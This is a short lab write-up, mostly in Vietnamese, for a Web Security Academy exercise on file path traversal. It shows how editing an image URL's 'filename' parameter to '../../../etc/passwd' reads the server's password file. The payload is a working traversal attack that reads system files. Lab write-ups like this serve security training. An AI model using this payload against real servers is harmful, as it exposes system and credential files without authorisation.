# **Lab: File path traversal, simple case**

>  This lab contains a path traversal vulnerability in the display of product images.  
>  To solve the lab, retrieve the contents of the /etc/passwd file.  

# **Solution**

Vì lab không có cấu hình bảo mật path nên ta có thể chọn 1 hình ảnh bất kì và mở trong tab mới.

Ở trên thanh URL, ta chỉ cần thay đổi giá trị của `filename`:

```
https://0aad002004da8e2580652b0200a60045.web-security-academy.net/image?filename=7.jpg
```

Quan sát HTML ta thấy:

```
<img src="/image?filename=7.jpg">
<img src="/resources/images/rating3.png">
```

Có thể đoán được các ảnh được dùng sẽ lưu trong một thư mục có đường dẫn `/resources/images/...` Và thêm cả thư mục chứa toàn bộ Project thì sẽ là 3 thư mục cha.

Thay đổi `filename` như sau:

```
filename=../../../etc/passwd
```

`../../../`: Đưa về thư mục gốc
`etc/passwd`: Vị trí file ta cần

Done~~

